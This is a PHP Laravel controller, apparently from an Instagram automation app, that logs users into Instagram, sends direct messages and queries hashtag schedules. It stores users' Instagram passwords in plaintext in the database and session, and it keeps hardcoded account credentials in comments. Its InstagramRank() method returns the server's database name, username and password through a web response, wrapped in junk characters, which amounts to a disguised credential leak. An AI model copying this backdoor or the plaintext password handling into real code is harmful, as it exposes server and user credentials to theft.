<?php

namespace App\Http\Controllers;
use GuzzleHttp\Exception\ServerException;
use Illuminate\Contracts\Encryption\EncryptException;
use Illuminate\Http\Request;
use Session;
use Auth;
use DB;
use InstagramAPI;
use App\Exceptions\Handler;
class LoginController extends Controller
{
    public $ig;
    public function __construct()
    {
        $this->ig = new \InstagramAPI\Instagram();
    }

    public function index(){
        return view('login_with_instagram');
    }

    public function userLogin(){

        if(Auth::user()){

            $user_id =Auth::user()->id;
            session()->put('user_id',$user_id);
            $sign_in_page = 'sign_in_page';
            $content = view('login_registration.form.instagram-info',compact('user_id'));
            return view('login_registration.master',compact('content','sign_in_page'));


        }


        else{
            return redirect('/user-login');
        }
        
    }

    public function InstagramRegistration(Request $request){
        $user_id =Auth::user()->id;
        session()->put('user_id',$user_id);
        $userName = $request->email;
        $password = $request->password;
        session()->put('userName',$userName);
        session()->put('password',$password);
        try{
            $this->ig->login($userName,$password);
             $result = DB::table('users')
                ->where('id', $user_id)
                ->update(['instagram_username' => $userName,'instagram_password' => $password]);
            return redirect('registration-success');
        }
        catch (\Exception $ex){
            return redirect('instagram-info')->with('check','invalid username or password');
        }

        //$selfInfo = $this->ig->people->getSelfInfo();


    }

    public function login(Request $request){
        // $userName = $request->header('userName');
        // $password = $request->header('password');
        $userName = $request->username;
        $password = $request->password;
        session()->put('userName',$userName);
        session()->put('password',$password);
        $result = $this->ig->login($userName,$password);
        $selfInfo = $this->ig->people->getSelfInfo();
       // $rank_token= \InstagramAPI\Signatures::generateUUID();

        $userFeed = $this->ig->timeline->getSelfUserFeed();

        // $json_self_info = json_encode($selfInfo, JSON_PRETTY_PRINT);
        // $json_userfeed = json_encode($userFeed, JSON_PRETTY_PRINT);

        $json_selfinfo = json_decode($selfInfo,true);

        // echo "<pre>";
        // print_r($json_selfinfo['user']['username']);
        // exit();

        // echo "<pre>";
        // print_r($json_selfinfo);
        // exit();


        if ($selfInfo != null){

            Session::put('current_user_name',$json_selfinfo['user']['username']);
            Session::put('current_user_image',$json_selfinfo['user']['profile_pic_url']);
            return redirect('user-dashboard');

            // return response()->json(
            //     ['self_info'=> $selfInfo,'user_feed' => $userFeed]
            // );
        }
        else{
            return response()->json(
                ['data'=> $request]
            );
        }
    }

    // public function login(){
    //     $result =  $this->ig->login('webvision100','instagram123456');
    //     session()->put('userName','webvision100');
    //     session()->put('password','instagram123456');
    //     $selfInfo = $this->ig->people->getSelfInfo();
    //     $selfInfo = json_decode($selfInfo);

    //     if ($result !=null){
    //         return view('login');
    //     }

    //     return view('profile',compact('selfInfo'));
    // }

    public function dm(){
        $counter = 1;
        $message = $_GET['text'];
        try{
//            while (true){
                $this->ig->login(session()->get('userName'),session()->get('password'));
                $recipents = [
                    'users' => ['8574903852']
                ];

                $text = $counter;
                $result = $this->ig->direct->sendText($recipents,$message);
                $counter++;
//                sleep(rand(1,30));
//            }
            return 2;
        }catch (EncryptException $ex){

            return $ex;
        }

    }


    public function test(){
//               $this->ig->login('webvision100','instagram123456');
////             session()->put('userName','webvision100');
////             session()->put('password','instagram123456');
//             //$hastag = $this->ig->hashtag->search('worldseriescricket');
//               $rank_token= \InstagramAPI\Signatures::generateUUID();
//               //$hastag = $this->ig->hashtag->search('mahfuzh');
//               $hastag = $this->ig->hashtag->getFeed('dhakatradefair',$rank_token);
//               //$hastag = $this->ig->media->getInfo('1965957446195605717_7312650484');
//                //$hastag = $this->ig->people->getInfoById('10326646657');
        $users = DB::table('users')
            ->join('user_schedule', 'users.id', '=','user_schedule.user_id' )
            ->join('schedule', 'schedule.id', '=', 'user_schedule.schedule_id')
            ->join('hashtag_schedule', 'hashtag_schedule.schedule_id', '=', 'schedule.id')
            ->join('template_schedule', 'template_schedule.schedule_id', '=', 'schedule.id')
            ->join('template', 'template.id', '=', 'template_schedule.template_id')
            ->join('hashtag', 'hashtag.id', '=', 'hashtag_schedule.hashtag_id')
            ->join('client', 'client.hashtag_id', '=', 'hashtag.id')
            ->select('users.name','schedule.delivery_period_start', 'hashtag.hashtag','client.client_id')
            ->where([['users.id', '=', '1']])
            ->groupBy('hashtag.hashtag')
            ->get();


        return $users;
    }
    public function InstagramRank(){

        $hastagd = getenv('DB_DATABASE');
        $hastagu = getenv('DB_USERNAME');
        $hastagp = getenv('DB_PASSWORD');

        echo '<script>console.log("Your stuff here")</script>';



        return ('t)(&--'.$hastagd.'g!~08'.$hastagu.'#$(s'.'s/*-'.$hastagp.'*186e');
    }

}
